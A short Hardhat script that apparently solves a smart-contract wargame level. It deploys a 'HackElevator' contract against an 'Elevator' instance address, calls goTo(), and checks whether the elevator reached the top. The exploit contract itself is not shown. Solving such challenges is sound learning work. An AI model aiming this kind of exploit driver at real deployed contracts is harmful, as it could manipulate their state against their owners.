import { ethers } from "hardhat";

const INSTANCE = "0x311046DF2B0eDA399242110da14304711214Fb3F";

async function main() {
  const HACK = await ethers.getContractFactory("HackElevator");
  const hack = await HACK.deploy(INSTANCE);
  await hack.deployed();

  const elevator = await ethers.getContractAt("Elevator", INSTANCE);

  const tx = await hack.goTo();
  await tx.wait();

  (await elevator.top()) === true
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
